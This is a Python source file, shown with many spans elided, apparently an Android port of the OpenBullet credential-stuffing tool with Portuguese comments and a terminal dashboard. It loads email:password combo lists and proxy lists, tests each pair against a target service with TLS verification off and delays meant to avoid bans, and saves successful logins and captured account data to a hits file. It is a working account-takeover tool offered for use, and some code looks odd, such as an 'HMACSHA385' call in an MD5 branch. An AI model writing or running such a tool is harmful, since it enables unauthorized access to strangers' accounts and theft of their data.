try:
    ...
    # Bibliotecas Rich adicionadas para o Painel
    ...
    requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS = "TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA:TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA:TLS_RSA_WITH_AES_128_GCM_SHA256:TLS_RSA_WITH_AES_256_GCM_SHA384:TLS_RSA_WITH_AES_128_CBC_SHA:TLS_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_3DES_EDE_CBC_SHA:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-256-GCM-SHA384:ECDHE:!COMP:TLS13-AES-256-GCM-SHA384:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256"
...
# ================================= VERIFICADOR DE STATS E UI RICH =================================
console = Console()
...
class Stats:
    ...
    def update_count(self, status):
        with self.lock:
            self.checked += 1
            if status == 'SUCCESS': self.hits += 1
            elif status == 'FAIL': self.fail += 1
            elif status == 'BAN': self.ban += 1
            elif status == 'RETRY': self.retry += 1
            elif status == 'CUSTOM': self.custom += 1
    ...
    def add_activity(self, message):
        with self.lock:
            ...
            if len(self.activities) > 12: self.activities.pop(0)

    def add_hit(self, email, password):
        with self.lock:
            self.recent_hits.append(f"{email}:{password}")
            if len(self.recent_hits) > 5: self.recent_hits.pop(0)
...
class Crypto:
    ...
    def HMACSHA385(rawInput,rawKey):
...
class BlockFunction:
    ...
    def Hmac(self, baseString:str,hashAlg,key:str,inputBase64:bool,keyBase64:bool,outputBase64:bool):
        ...
        if hashAlg == "MD5":
            ...
            signature  = Crypto.HMACSHA385(rawInput,rawKey)
...
class OBRequest():
    ...
    def Perform(self, url, method, proxy):
        ...
        self.response = self.session.send(request, timeout=self.timeout, allow_redirects=self.auto_redirect, proxies=proxy, verify=False)
...
lock = f"""{k}                                                                                                                       
  ___ _   _ _    _    ___ _____ _____   __
 | _ ) | | | |  | |  | __|_   _| _ \ \ / /
 | _ \ |_| | |__| |__| _|  | | |  _/\ V / 
 |___/\___/|____|____|___| |_| |_|   |_|                                            
...
"""
RUN = f"{pe} Config executado!"
version = f"""
{lgn}    Openbullet Py  
\033[1;37m    Version : 2.2
{lrd}   Bora pescar : @thaysonzica\n\n            
"""

# ================================= PAINEL RICH LAYOUT =================================
BANNER_OB = """
[bold magenta]====================================[/bold magenta]
[bold cyan]       OPENBULLET ANON + LOLI + SVB      [/bold cyan]
[bold magenta]====================================[/bold magenta]

[bold yellow][⚡][/bold yellow] [bold white]Motor      :[/bold white] [bold green]OpenBullet Python[/bold green]
[bold yellow][⚡][/bold yellow] [bold white]Versão     :[/bold white] [bold green]2.2 (Advanced)[/bold green]
[bold yellow][⚡][/bold yellow] [bold white]Modo       :[/bold white] [bold green]Anon + Loli + SVB[/bold green]
[bold yellow][⚡][/bold yellow] [bold white]Filtro     :[/bold white] [bold green]Ativo[/bold green]
"""

def create_stats_table():
    table = Table(box=box.ROUNDED, show_header=True, header_style="bold cyan", pad_edge=False, expand=True)
    table.add_column("Métrica", style="cyan", width=20)
    table.add_column("Contagem", justify="right", style="green", width=15)
    table.add_row("Verificados", str(stats.checked))
    table.add_row("HITS (SUCCESS)", str(stats.hits), style="bold green")
    table.add_row("Fails (Ruins)", str(stats.fail), style="red")
    table.add_row("BAN", str(stats.ban), style="magenta")
    table.add_row("RETRY", str(stats.retry), style="yellow")
    table.add_row("CUSTOM", str(stats.custom), style="cyan")
    table.add_row("Erros", str(stats.errors), style="dim red")
    table.add_row("", "")
    table.add_row("CPM", str(stats.get_cpm()), style="bold cyan")
    return table

def create_proxy_table():
    table = Table(box=box.ROUNDED, show_header=True, header_style="bold magenta", pad_edge=False, expand=True)
    table.add_column("Proxy Info", style="magenta", width=20)
    table.add_column("Dados", justify="left", style="white", width=40)
    table.add_row("Total Carregadas", str(stats.total_proxies))
    table.add_row("Proxy Ativa Agora", str(stats.current_proxy), style="bold yellow")
    return table

def create_hits_table():
    table = Table(box=box.ROUNDED, show_header=True, header_style="bold green", pad_edge=False, expand=True)
    table.add_column("HITS Recentes", style="green", width=35)
    for hit in stats.recent_hits:
        table.add_row(hit)
    if not stats.recent_hits:
        table.add_row("[dim]Nenhum hit ainda...[/dim]")
    return table

def create_ob_panel():
    thayson_text = """
[bold green]✨ OPENBULLET ANON + LOLI + SVB ✨[/bold green]
[bold yellow]🔥 Verificador Avançado v2.2 🔥[/bold yellow]
[bold magenta]💎 Filtragem Ativa 💎[/bold magenta]
    """
    return Panel(thayson_text, border_style="magenta", title="[bold cyan]Créditos[/bold cyan]", expand=True)

def create_activities_group(progress):
    activities_text = "\n".join(stats.activities)
    return Group(
        activities_text,
        "",
        progress
...
def create_layout(progress):
    ...
    layout["header"].update(Panel(BANNER_OB, title="OPENBULLET", border_style="bold magenta"))
    ...
    layout["stats"].split_column(
        ...
        Layout(name="proxy_table", ratio=1),
        Layout(name="hits_table", ratio=1)
    )
    layout["stats_table"].update(Panel(create_stats_table(), title="[bold green]Estatísticas[/bold green]", border_style="green"))
    layout["proxy_table"].update(Panel(create_proxy_table(), title="[bold magenta]Proxies[/bold magenta]", border_style="magenta"))
    layout["hits_table"].update(Panel(create_hits_table(), title="[bold green]HITS Recentes[/bold green]", border_style="green"))
    
    layout["activities"].update(
        Panel(
            create_activities_group(progress), 
            title="[bold cyan]Atividades OB[/bold cyan]", 
            border_style="cyan"
        )
    )
    
    layout["footer"].split_row(
        Layout(name="ob_panel", ratio=1),
        Layout(name="path_info", ratio=1)
    )
    layout["ob_panel"].update(create_ob_panel())
    layout["path_info"].update(Panel(f"[bold cyan]Resultados em: /sdcard/BULLET PY/[/bold cyan]", border_style="cyan", expand=True))
...
def main_loop():
    ...
    def criar_pastas():
        directories = [
            '/sdcard/BULLET PY/',
            '/sdcard/BULLET PY/CONFIGS/',
            '/sdcard/BULLET PY/PROXY/',
            '/sdcard/BULLET PY/COMBO/'
        ]
        for dir_path in directories:
            if not os.path.exists(dir_path):
                os.makedirs(dir_path)

    def escolher_arquivo(msg, dir_path, file_extension=None):
        if file_extension:
        ...
        try:
            ...
            if escolha < 0 or escolha >= len(files): raise ValueError
            return os.path.join(dir_path, files[escolha])
        except (ValueError, IndexError):
            print(f"{lrd}Escolha inválida! Tente novamente.")
            return escolher_arquivo(msg, dir_path, file_extension)

    criar_pastas()

    config_dir = '/sdcard/BULLET PY/CONFIGS/'
    config_path = escolher_arquivo(f"{lrd}[{lgn}~{lrd}]{gn} ESCOLHA A CONFIG", config_dir)
    # Obtém o nome base da config (sem extensão) para usar como nome do arquivo de hits automático
    config_name = os.path.splitext(os.path.basename(config_path))[0]
    hits_auto_path = f'/sdcard/BULLET PY/HITS_{config_name}.txt'

    Type = input(f"{lrd}[{lgn}~{lrd}]{gn} TIPO DO PROXY : {cn}")
    try:
        config_text = ConfigToText(config_path)
    except:
        print(f'{TF.ERROR}! Check the file {k}{config_path}')
        return False

    proxy_dir = '/sdcard/BULLET PY/PROXY/'
    proxy_path = escolher_arquivo(f'{lrd}[{lgn}~{lrd}]{gn} ESCOLHA O PROXY', proxy_dir, '.txt')
    try:
        with open(proxy_path, 'r') as f:
            proxy_list = [line.strip() for line in f if line.strip()]
    except:
        print(f'{TF.ERROR}! Check the file {k}{proxy_path}')
        return False

    combo_dir = '/sdcard/BULLET PY/COMBO/'
    combo_path = escolher_arquivo(f'{lrd}[{lgn}~{lrd}]{gn} ESCOLHA O COMBO', combo_dir, '.txt')
    try:
        with open(combo_path, 'r') as f:
            combo_list = [line.strip() for line in f if line.strip()]
    except:
        print(f'{TF.ERROR}! Check the file {k}{combo_path}')
        return False

    stats.total_proxies = len(proxy_list)
    stats.current_proxy = "Nenhuma"
    
    time.sleep(1)
    clear()

    # --- REDUÇÃO DO FLICKER E CONTROLE DE BOTS ---
    progress = Progress(
        TextColumn("[bold yellow]⏳ PROGRESSO:[/bold yellow]"),
    ...
    task_id = progress.add_task("Verificando", total=len(combo_list))
    layout = create_layout(progress)
    
    def check_account(combo_line):
        # DELAY PARA EVITAR BAN - Controla a velocidade mesmo com 2 bots
        time.sleep(2) 
        
        if not combo_line or ':' not in combo_line: 
            stats.update_count("FAIL")
        ...
        stats.add_activity(f"[cyan]Verificando: {user}[/cyan]")
        
        try:
            open_bullet = OpenBullet(config=config_text, USER=user, PASS=password, proxy=current_proxy, proxy_type=str(Type))
            run = open_bullet.run()
            
            if 'SUCCESS' == run:
                # Captura todas as variáveis marcadas como Capture
                captures = open_bullet.data.Variables.Captures()
                capture_str = " | ".join([f"{c.Name} = {c.Value}" for c in captures if not c.Hidden])
                # Formato final: email:senha | Capture1 = valor1 | Capture2 = valor2 ...
                hit_line = f"{user}:{password}"
                if capture_str:
                    hit_line += f" | {capture_str}"
                
                stats.add_activity(f"[bold green]💎 HIT: {hit_line}[/bold green]")
                stats.add_hit(user, password)
                # Salva automaticamente no arquivo com nome da config
                with open(hits_auto_path, 'a', encoding='utf-8') as suc:
                    suc.write(hit_line + "\n")
            elif 'BAN' == run:
                stats.add_activity(f"[magenta]BAN: {user}[/magenta]")
            elif 'FAIL' == run:
                pass
            elif 'NONE' == run:
                pass
            elif 'ERROR' == run:
                stats.add_activity(f"[red]ERRO: {user}[/red]")
            elif 'RETRY' == run:
                stats.add_activity(f"[yellow]RETRY: {user}[/yellow]")
            elif 'CUSTOM' == run:
                stats.add_activity(f"[cyan]CUSTOM: {user}[/cyan]")
                
            stats.update_count(run)
        except Exception as e:
            stats.update_count("ERROR")
            stats.add_activity(f"[red]Exceção Interna: {str(e)[:50]}[/red]")
        finally:
            progress.advance(task_id)

    # Execução com Live atualização limpa e limite de 2 BOTS
    with Live(layout, console=console, refresh_per_second=2, screen=True) as live:
        with concurrent.futures.ThreadPoolExecutor(max_workers=2) as executor: # MÁXIMO DE 2 BOTS (NÃO PASSA DISSO)
            futures = {executor.submit(check_account, combo): combo for combo in combo_list}  
            for future in concurrent.futures.as_completed(futures):
                # Atualiza as tabelas apenas trocando o conteúdo dos Painéis de forma limpa
                layout["stats_table"].update(Panel(create_stats_table(), title="[bold green]Estatísticas[/bold green]", border_style="green"))
                layout["proxy_table"].update(Panel(create_proxy_table(), title="[bold magenta]Proxies[/bold magenta]", border_style="magenta"))
                layout["hits_table"].update(Panel(create_hits_table(), title="[bold green]HITS Recentes[/bold green]", border_style="green"))
                layout["activities"].update(
    ...
    # Menu Final quando o combo atinge 100%
    console.print(Panel(create_stats_table(), title="[bold magenta]Finalizado - OPENBULLET[/bold magenta]", border_style="magenta"))
    while True:
        print(f"\n{lgn}[1]{gn} Testar outro combo (mesma config/proxy)")
        print(f"{lgn}[2]{gn} Escolher outra config/proxy (recomeçar)")
        print(f"{lgn}[3]{gn} Encerrar script\n")
        op = input(f"{cn}Escolha: {gn}").strip()
        if op == '1':
            return True # Mantém config, roda outro combo
        elif op == '2':
            return False # Volta ao zero absoluto
        elif op == '3':
            print(f"{lrd}Encerrando..."); sys.exit(0)
        else:
            print(f"{lrd}Opção inválida.")
...
if __name__ == "__main__":
    ...
    reiniciar_tudo = False
    while True:
        if reiniciar_tudo:
            # Reseta stats (limpa contadores e atividades)
            stats.__init__()
            clear()
            ToSleep(lock, 0.0030)
            ToSleep(version, 0.05)
